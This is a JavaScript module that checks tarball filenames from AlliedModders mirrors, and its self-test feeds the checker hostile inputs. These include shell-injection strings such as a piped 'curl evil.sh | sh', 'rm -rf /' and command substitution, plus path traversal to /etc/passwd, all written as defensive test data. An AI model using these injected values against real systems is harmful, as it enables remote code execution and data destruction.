// Filenames come from the AlliedModders mirrors as plain HTTP content, so they are
// untrusted: reject anything that could reach a shell or escape /tmp.
const isAddonTarball = (name) => /^[\w.+-]+\.tar\.gz$/.test(name);

module.exports = {isAddonTarball};

if(require.main === module) {
	const assert = require("assert");

	for(const good of [
		"mmsource-1.11.0-git1155-linux.tar.gz",
		"sourcemod-1.12.0-git7210-linux.tar.gz"
	])
		assert(isAddonTarball(good), `should accept ${good}`);

	for(const bad of [
		'x.tar.gz"; curl evil.sh | sh; "',
		"x.tar.gz; rm -rf /",
		"$(id).tar.gz",
		"`id`.tar.gz",
		"x.tar.gz\nid",
		"../../etc/passwd.tar.gz",
		"/abs/path.tar.gz",
		"https://evil.example/x.tar.gz",
		"x.tar.gz ",
		"x.zip",
		""
	])
		assert(!isAddonTarball(bad), `should reject ${JSON.stringify(bad)}`);

	console.log("addonFilename: ok");
}
